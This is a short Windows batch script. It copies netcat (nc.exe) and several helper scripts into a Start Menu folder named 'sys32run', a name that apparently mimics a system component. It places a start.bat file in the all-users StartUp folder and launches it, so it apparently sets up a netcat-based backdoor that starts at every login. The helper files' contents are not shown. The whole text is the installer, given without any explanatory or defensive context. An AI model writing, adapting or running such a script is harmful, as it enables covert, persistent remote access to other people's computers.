set /p x=path:
mkdir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sys32run"
copy "%x%\sys32run1.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sys32run\"
copy "%x%\sys32run2.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sys32run\"
copy "%x%\nc.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sys32run\"
copy "%x%\start.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\start.bat"
pause
